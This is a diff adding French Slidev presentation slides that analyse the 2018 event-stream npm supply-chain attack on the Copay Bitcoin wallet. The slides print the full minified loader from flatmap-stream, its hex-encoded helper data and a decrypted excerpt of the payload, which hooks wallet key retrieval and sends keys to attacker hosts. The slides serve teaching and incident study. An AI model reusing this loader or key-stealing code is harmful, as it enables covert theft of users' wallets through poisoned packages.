@@ -284,6 +284,29 @@ import attacks from './data/attacks'
 
 ---
 transition: view-transition
+layout: case
+reveal: 1
+kicker: Affaire · novembre 2018
+subject:
+  header: Pièce 01 · paquet npm
+  flag: ■ Piégé
+  name: event-stream
+  meta: v3.3.6 · sept. 2018
+  fields:
+    - { label: Téléchargements, value: 2 M / semaine }
+    - { label: Mainteneur, value: dominictarr → right9ctrl }
+    - { label: Dépendance piégée, value: flatmap-stream@0.1.1, alert: true }
+modus:
+  - { label: Point d'entrée, value: Statut de mainteneur acquis via ingénierie sociale, at: '05.09' }
+  - { label: Charge, value: Code minifié et chiffré dans une dépendance indirecte, at: ['09.09', '05.10'] }
+  - { label: Cible, value: Les portefeuilles Bitcoin des utilisateur·ices de l’app Copay, at: '05.10' }
+  - { label: Détection, value: 'Par hasard, après 1 mois et demi', alert: true, at: ['20.11', '26.11'] }
+timeline:
+  - { date: '05.09', label: Accès obtenu }
+  - { date: '09.09', label: Dépendance ajoutée }
+  - { date: '05.10', label: Charge publiée }
+  - { date: '20.11', label: Issue n° 116 }
+  - { date: '26.11', label: Retrait }
 ---
 
 <!-- the title receives the event-stream label of the timeline (the label uses the title font, so that
@@ -292,6 +315,139 @@ transition: view-transition
 <h1><span style="view-transition-name: event-stream; view-transition-class: focus-text; display: inline-block; line-height: 1">event-stream</span></h1>
 
 <FocusTarget morph="event-stream" />
+
+<style>
+/* minified code: wrapped anywhere, like in an editor with line wrapping */
+.minified pre,
+.minified code {
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+
+/* a long excerpt: smaller code, so that the window fits under the status bar */
+.dense {
+  --slidev-code-font-size: 22px;
+  --slidev-code-line-height: 32px;
+}
+</style>
+
+::window-1::
+
+<AppWindow title="github.com/dominictarr/event-stream · issue n° 116">
+  <img src="./assets/event-stream-email.png" class="block w-[1400px] p-[11px] pt-[8px]" />
+</AppWindow>
+
+::window-2::
+
+<AppWindow title="event-stream@3.3.6 · package.json" class="w-[900px]">
+
+```json {3}
+"dependencies": {
+  "duplexer": "~0.1.1",
+  "flatmap-stream": "^0.1.0",
+  "from": "~0",
+  "map-stream": "0.0.7",
+  "pause-stream": "0.0.11",
+  "split": "^1.0.1",
+  "stream-combiner": "^0.2.2",
+  "through": "~2.3.8"
+}
+```
+
+</AppWindow>
+
+::window-2-2::
+
+<!-- the payload appended to the minified code of flatmap-stream 0.1.1, on one line in the file -->
+<AppWindow title="flatmap-stream@0.1.1 · index.min.js" class="minified w-[1400px]">
+
+```js
+!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,"hex").toString()}var n=r(e("2e2f746573742f64617461")),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,""),f.exports(n[1])}catch(r){}}();
+```
+
+</AppWindow>
+
+::window-3::
+
+<!-- test/data.js of flatmap-stream 0.1.1: two payloads encrypted with AES-256, then the names the
+     minified code needs, hex-encoded so that nothing readable shows in the file (payloads abridged) -->
+<AppWindow title="flatmap-stream@0.1.1 · test/data.js" class="minified w-[1400px]">
+
+```js {2-3}
+module.exports = [
+  "75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b79fb…",
+  "db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571…",
+  "63727970746f",                                     // "crypto"
+  "656e76",                                           // "env"
+  "6e706d5f7061636b6167655f6465736372697074696f6e",   // "npm_package_description"
+  "616573323536",                                     // "aes256"
+  "6372656174654465636970686572",                     // "createDecipher"
+  "5f636f6d70696c65",                                 // "_compile"
+  "686578",                                           // "hex"
+  "75746638"                                          // "utf8"
+]
+```
+
+</AppWindow>
+
+::window-3-2::
+
+<!-- the key: npm exposes the description of the project being built as npm_package_description -->
+<AppWindow title="bitpay/copay · package.json" class="w-[900px]">
+
+```json {3}
+{
+  "name": "copay",
+  "description": "A Secure Bitcoin Wallet",
+  "version": "5.1.0",
+  "scripts": {
+    "build:ios-release": "…"
+  }
+}
+```
+
+</AppWindow>
+
+::window-3-3::
+
+<!-- the third payload, written by the second one into ReedSolomonDecoder.js during the release builds
+     of Copay (build:*-release), then shipped in the app: excerpt of the decrypted code, from
+     es-incident.github.io/payloads.html (try/catch, the send and storage helpers left out) -->
+<AppWindow title="copay · ReedSolomonDecoder.js · charge injectée" class="dense w-[1400px]">
+
+```js {9-11,17,19}
+!function () {
+  // r() : chiffre avec la clé de l'attaquant, envoie à copayapi.host et 111.90.151.134
+  l("profile", function (e) {
+    for (var t in e.credentials) {
+      var n = e.credentials[t];
+      "livenet" == n.network && l("balanceCache-" + n.walletId, function (e) {
+        var t = this;
+        t.balance = parseFloat(e.balance.split(" ")[0]),
+        "btc" == t.coin && t.balance < 100 ||
+        "bch" == t.coin && t.balance < 1e3 ||
+        (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
+      }.bind(n))
+    }
+  });
+  var e = require("bitcore-wallet-client/lib/credentials.js");
+  e.prototype.getKeysFunc = e.prototype.getKeys,
+  e.prototype.getKeys = function (e) {
+    var t = this.getKeysFunc(e);
+    global.CSSMap[this.xPubKey] && r("p", e + "\t" + this.xPubKey);
+    return t
+  }
+}();
+```
+
+</AppWindow>
+
+::window-4::
+
+<!-- the first report of the attack, by a developer intrigued by a deprecation warning -->
+<AppWindow title="github.com/dominictarr/event-stream/issues/116">
+  <img src="./assets/event-stream-issue.png" class="block h-[760px] p-[3px] pt-0" />
+</AppWindow>
 
 ---
 
